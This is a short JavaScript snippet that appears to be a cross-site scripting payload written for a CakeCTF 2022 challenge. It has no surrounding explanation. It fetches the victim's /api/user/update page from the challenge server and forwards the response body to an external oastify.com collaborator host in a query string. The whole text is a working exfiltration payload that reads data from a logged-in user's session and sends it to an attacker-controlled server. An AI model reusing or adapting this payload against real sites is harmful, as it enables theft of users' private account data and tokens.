fetch("http://web1.2022.cakectf.com:8003/api/user/update").then((res) => {
    return res.text();
}).then(data => {
    fetch("https://l4qs5ogox3mbe3syub12hhnas1ytmi.oastify.com?data="+data);
})
